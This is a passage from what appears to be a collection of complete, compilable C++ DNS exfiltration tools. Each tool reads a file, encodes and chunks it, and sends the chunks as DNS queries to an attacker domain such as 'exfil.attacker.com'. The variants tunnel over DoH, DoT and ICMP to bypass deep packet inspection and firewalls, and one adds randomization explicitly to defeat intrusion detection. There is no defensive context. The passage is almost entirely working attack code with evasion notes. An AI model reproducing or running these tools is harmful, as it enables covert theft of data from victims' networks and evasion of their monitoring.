        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            std::cout << "[*] DoH query " << seq << "\n";
            
            if (sendDoHQuery(subdomain)) {
                std::cout << "    [+] Sent\n";
            } else {
                std::cout << "    [-] Failed\n";
            }
            
            usleep(50000);
        }
        
        std::cout << "[+] Sent " << seq << " DoH queries\n";
    }
    
    ~DNSDoHExfil() {
        curl_global_cleanup();
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <doh_url> <base_domain> <data_file>\n";
        std::cerr << "Example: " << argv[0] 
                  << " https://1.1.1.1/dns-query exfil.attacker.com file.bin\n";
        return 1;
    }
    srand(time(NULL));
    DNSDoHExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** DNS over HTTPS (DoH) exfiltration. Encrypted DNS tunnel — bypasses deep packet inspection (DPI). Queries look like legitimate HTTPS traffic to a DoH resolver.

---

### 9. DNS over TLS (DoT) Exfiltration
```cpp
// Compile: g++ -o dns_exfil_dot dns_exfil_dot.cpp -lssl -lcrypto
// Run: ./dns_exfil_dot <dot_server> <dot_port> <base_domain> <data_file>
// Requires: libssl-dev

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

class DNSDoTExfil {
private:
    std::string dotServer;
    int dotPort;
    std::string baseDomain;
    SSL_CTX* ctx;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string base32Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string result;
        int bits = 0;
        uint32_t value = 0;
        for (uint8_t b : data) {
            value = (value << 8) | b;
            bits += 8;
            while (bits >= 5) {
                result += alphabet[(value >> (bits - 5)) & 0x1F];
                bits -= 5;
            }
        }
        if (bits > 0) {
            result += alphabet[(value << (5 - bits)) & 0x1F];
        }
        return result;
    }
    
    bool sendDoTQuery(const std::string& subdomain) {
        // Create TCP socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        struct hostent* host = gethostbyname(dotServer.c_str());
        if (!host) {
            close(sock);
            return false;
        }
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dotPort);
        memcpy(&dest.sin_addr.s_addr, host->h_addr, host->h_length);
        
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) != 0) {
            close(sock);
            return false;
        }
        
        // TLS handshake
        SSL* ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        
        if (SSL_connect(ssl) != 1) {
            SSL_free(ssl);
            close(sock);
            return false;
        }
        
        // Build DNS query
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(16); pos += 2;  // TXT
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        // DoT requires 2-byte length prefix
        uint8_t framed[512];
        *(uint16_t*)framed = htons(pos);
        memcpy(framed + 2, query, pos);
        
        // Send over TLS
        SSL_write(ssl, framed, pos + 2);
        
        // Read response
        uint8_t response[1024];
        SSL_read(ssl, response, sizeof(response));
        
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
        return true;
    }
    
public:
    DNSDoTExfil(const std::string& server, int port, const std::string& domain)
        : dotServer(server), dotPort(port), baseDomain(domain) {
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();
        
        ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] DNS over TLS (DoT) exfiltration\n";
        std::cout << "[*] DoT server: " << dotServer << ":" << dotPort << "\n";
        
        std::string encoded = base32Encode(data);
        
        int chunkSize = 50;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            std::cout << "[*] DoT query " << seq << "\n";
            sendDoTQuery(subdomain);
            usleep(100000);
        }
        
        std::cout << "[+] Sent " << seq << " DoT queries\n";
    }
    
    ~DNSDoTExfil() {
        SSL_CTX_free(ctx);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dot_server> <dot_port> <base_domain> <data_file>\n";
        std::cerr << "Example: " << argv[0] 
                  << " 1.1.1.1 853 exfil.attacker.com file.bin\n";
        return 1;
    }
    srand(time(NULL));
    DNSDoTExfil exfil(argv[1], atoi(argv[2]), argv[3]);
    exfil.run(argv[4]);
    return 0;
}
```

**Technique:** DNS over TLS (DoT) exfiltration on port 853. Encrypted DNS tunnel — no DPI visibility. Uses TCP + TLS to disguise as HTTPS traffic.

---

### 10. DNS Exfiltration with Compression
```cpp
// Compile: g++ -o dns_exfil_compressed dns_exfil_compressed.cpp -lz
// Run: ./dns_exfil_compressed <dns_server> <base_domain> <data_file>
// Requires: zlib1g-dev

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <zlib.h>

class DNSCompressedExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::vector<uint8_t> zlibCompress(const std::vector<uint8_t>& data) {
        uLongf compressedSize = compressBound(data.size());
        std::vector<uint8_t> compressed(compressedSize);
        
        if (compress2(compressed.data(), &compressedSize, 
                      data.data(), data.size(), 9) != Z_OK) {
            return {};
        }
        compressed.resize(compressedSize);
        return compressed;
    }
    
    std::string base32Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string result;
        int bits = 0;
        uint32_t value = 0;
        for (uint8_t b : data) {
            value = (value << 8) | b;
            bits += 8;
            while (bits >= 5) {
                result += alphabet[(value >> (bits - 5)) & 0x1F];
                bits -= 5;
            }
        }
        if (bits > 0) {
            result += alphabet[(value << (5 - bits)) & 0x1F];
        }
        return result;
    }
    
public:
    DNSCompressedExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(1); pos += 2;   // A
        *(uint16_t*)(query + pos) = htons(1); pos += 2;   // IN
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Compressed DNS exfiltration\n";
        std::cout << "[*] Original size: " << data.size() << " bytes\n";
        
        // Compress with zlib level 9 (max compression)
        std::vector<uint8_t> compressed = zlibCompress(data);
        if (compressed.empty()) {
            std::cerr << "[!] Compression failed\n";
            return;
        }
        
        std::cout << "[*] Compressed size: " << compressed.size() 
                  << " bytes (" 
                  << (100 * compressed.size() / data.size()) << "%)\n";
        
        std::string encoded = base32Encode(compressed);
        std::cout << "[*] Base32 length: " << encoded.length() << "\n";
        
        int chunkSize = 50;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendQuery(subdomain);
            usleep(50000);
        }
        
        std::cout << "[+] Sent " << seq << " queries (compressed)\n";
        std::cout << "[+] Compression saved: " 
                  << (data.size() - compressed.size()) << " bytes\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSCompressedExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Zlib compression (level 9) before encoding. Reduces DNS query count by 60-90% for compressible data (text, configs, source code). Essential for large files.

---

### 11. DNS Exfiltration over ICMP-DNS Hybrid
```cpp
// Compile: g++ -o dns_exfil_hybrid dns_exfil_hybrid.cpp
// Run: sudo ./dns_exfil_hybrid <dns_server> <base_domain> <data_file>
// Requires: root privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

class DNSHybridExfil {
private:
    std::string dnsServer, baseDomain;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    // Send DNS query encapsulated in ICMP payload (if UDP DNS blocked)
    bool sendICMPDNS(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = htons(getpid() & 0xFFFF);
        icmp->un.echo.sequence = htons(1);
        
        // Embed DNS query in ICMP payload
        uint8_t* dnsPayload = packet + sizeof(struct icmphdr);
        
        // DNS header
        *(uint16_t*)(dnsPayload + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(dnsPayload + 2) = htons(0x0100);
        *(uint16_t*)(dnsPayload + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(dnsPayload + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(dnsPayload + pos) = htons(1); pos += 2;
        *(uint16_t*)(dnsPayload + pos) = htons(1); pos += 2;
        
        int totalLen = sizeof(struct icmphdr) + pos;
        icmp->checksum = checksum(packet, totalLen);
        
        sendto(sock, packet, totalLen, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
public:
    DNSHybridExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] ICMP-DNS hybrid exfiltration\n";
        std::cout << "[*] DNS queries embedded in ICMP payloads\n";
        
        std::string encoded;
        for (uint8_t b : data) {
            static const char* hex = "0123456789abcdef";
            encoded += hex[(b >> 4) & 0xF];
            encoded += hex[b & 0xF];
        }
        
        int chunkSize = 30;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendICMPDNS(subdomain);
            usleep(100000);
        }
        
        std::cout << "[+] Sent " << seq << " hybrid queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSHybridExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** DNS queries embedded inside ICMP echo payloads. Bypasses firewalls that only inspect ICMP headers, not payloads. Good for environments where ICMP is allowed but UDP DNS is filtered.

---

### 12. DNS Exfiltration with Randomization (Anti-Detection)
```cpp
// Compile: g++ -o dns_exfil_stealth dns_exfil_stealth.cpp
// Run: ./dns_exfil_stealth <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <random>
#include <thread>
#include <chrono>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSStealthExfil {
private:
    std::string dnsServer, baseDomain;
    std::mt19937 gen;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string base32Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string result;
        int bits = 0;
        uint32_t value = 0;
        for (uint8_t b : data) {
            value = (value << 8) | b;
            bits += 8;
            while (bits >= 5) {
                result += alphabet[(value >> (bits - 5)) & 0x1F];
                bits -= 5;
            }
        }
        if (bits > 0) {
            result += alphabet[(value << (5 - bits)) & 0x1F];
        }
        return result;
    }
    
    // Random padding subdomain to break pattern detection
    std::string randomPadding(int length) {
        static const char* alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
        std::uniform_int_distribution<> dis(0, strlen(alphabet) - 1);
        std::string result;
        for (int i = 0; i < length; i++) {
            result += alphabet[dis(gen)];
        }
        return result;
    }
    
public:
    DNSStealthExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {
        std::random_device rd;
        gen = std::mt19937(rd());
    }
    
    bool sendQuery(const std::string& subdomain, uint16_t qtype) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(gen() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(qtype); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Stealth DNS exfiltration\n";
        std::cout << "[*] Anti-detection: random intervals, random padding, mixed types\n";
        
        std::string encoded = base32Encode(data);
        
        int chunkSize = 30;
        int seq = 0;
        
        std::vector<uint16_t> qtypes = {1, 2, 5, 15, 16, 33, 255};
        std::uniform_int_distribution<> delayDis(500, 5000);
        std::uniform_int_distribution<> typeDis(0, qtypes.size() - 1);
        std::uniform_int_distribution<> padDis(0, 10);
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            // Add random padding to break pattern
            std::string padding = randomPadding(padDis(gen));
            std::string subdomain = std::string(seqStr) + "." + padding + "." + chunk;
            
            uint16_t qtype = qtypes[typeDis(gen)];
            
            sendQuery(subdomain, qtype);
            
            // Random delay
            int delayMs = delayDis(gen);
            usleep(delayMs * 1000);
        }
        
        std::cout << "[+] Sent " << seq << " stealth queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    DNSStealthExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Anti-detection via random padding, random delays, and mixed query types. Breaks statistical patterns that IDS uses to detect DNS tunneling.

---

### 13. DNS Exfiltration via Subdomain Sequential Pattern
```cpp
// Compile: g++ -o dns_exfil_sequential dns_exfil_sequential.cpp
// Run: ./dns_exfil_sequential <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSSequentialExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    DNSSequentialExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Sequential pattern exfiltration\n";
        
        // Encode as hex chunks
        std::string encoded;
        static const char* hex = "0123456789abcdef";
        for (uint8_t b : data) {
            encoded += hex[(b >> 4) & 0xF];
            encoded += hex[b & 0xF];
        }
        
        // Pattern: c0.a1b2c3d4, c1.a1b2c3d5, c2.a1b2c3d6
        // Sequence number as prefix (c<N>), then chunk data
        int chunkSize = 40;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char prefix[16];
            snprintf(prefix, sizeof(prefix), "c%d", seq);
            
            std::string subdomain = std::string(prefix) + "." + chunk;
            
            std::cout << "[*] Query " << seq << "\n";
            sendQuery(subdomain);
            usleep(80000);
            seq++;
        }
        
        std::cout << "[+] Sent " << seq << " sequential queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSSequentialExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Sequential pattern with explicit chunk numbering (c0, c1, c2...). Easy reassembly on server side. Good for streaming data where order matters.

---

### 14. DNS Exfiltration with Base64url Encoding
```cpp
// Compile: g++ -o dns_exfil_b64url dns_exfil_b64url.cpp
// Run: ./dns_exfil_b64url <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSBase64URLExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    // Base64url: no padding, uses - and _ instead of + and /
    std::string base64urlEncode(const std::vector<uint8_t>& data) {
        static const char* alphabet = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
        std::string result;
        int val = 0, bits = 0;
        for (uint8_t b : data) {
            val = (val << 8) | b;
            bits += 8;
            while (bits >= 6) {
                result += alphabet[(val >> (bits - 6)) & 0x3F];
                bits -= 6;
            }
        }
        if (bits > 0) {
            result += alphabet[(val << (6 - bits)) & 0x3F];
        }
        // No padding for URL-safe encoding
        return result;
    }
    
public:
    DNSBase64URLExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(16); pos += 2;  // TXT
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Base64url DNS exfiltration\n";
        std::cout << "[*] Uses URL-safe alphabet (-_)\n";
        
        std::string encoded = base64urlEncode(data);
        std::cout << "[*] Encoded length: " << encoded.length() << "\n";
        
        // DNS labels can use any byte 0-255 but standard DNS only alphanumeric + -
        // Base64url happens to be DNS-safe
        int chunkSize = 50;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "s%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendQuery(subdomain);
            usleep(60000);
        }
        
        std::cout << "[+] Sent " << seq << " queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSBase64URLExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Base64url encoding — DNS-safe alphabet. More efficient than base32 (uses 6-bit symbols vs 5-bit). 25% more data per query than base32.

---

### 15. DNS Exfiltration via Reverse Subdomain Labels
```cpp
// Compile: g++ -o dns_exfil_reverse dns_exfil_reverse.cpp
// Run: ./dns_exfil_reverse <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <algorithm>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSReverseExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    DNSReverseExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Reverse subdomain exfiltration\n";
        std::cout << "[*] Format: chunk.sequence.base (reversed)\n";
        
        // Encode as hex
        std::string encoded;
        static const char* hex = "0123456789abcdef";
        for (uint8_t b : data) {
            encoded += hex[(b >> 4) & 0xF];
            encoded += hex[b & 0xF];
        }
        
        // Reverse processing - read backward but send forward
        // Server can reconstruct by sorting on sequence
        int chunkSize = 40;
        int totalChunks = (encoded.length() + chunkSize - 1) / chunkSize;
        
        for (int seq = 0; seq < totalChunks; seq++) {
            size_t startPos = seq * chunkSize;
            size_t len = std::min((size_t)chunkSize, encoded.length() - startPos);
            std::string chunk = encoded.substr(startPos, len);
            
            // Reverse: sequence comes AFTER chunk
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "s%04x", seq);
            
            std::string subdomain = chunk + "." + seqStr;
            
            sendQuery(subdomain);
            usleep(60000);
        }
        
        std::cout << "[+] Sent " << totalChunks << " reverse-format queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
